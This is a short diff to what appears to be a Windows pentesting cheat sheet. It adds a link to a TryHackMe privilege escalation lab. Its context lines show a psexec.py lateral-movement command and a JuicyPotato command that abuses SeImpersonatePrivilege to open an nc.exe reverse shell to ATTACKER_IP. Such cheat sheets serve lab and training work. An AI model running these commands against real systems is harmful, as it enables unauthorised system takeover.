@@ -1094,6 +1094,11 @@ psexec.py -n -k domain.local/Administrator@PC-NAME
 
 ## Privilege Escalation
 
+### Tryhackme room
+```
+https://tryhackme.com/room/windowsprivescarena
+```
+
 ### SeImpersonatePrivilege (JuicyPotato.exe)
 ```
 .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\PATH\TO\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
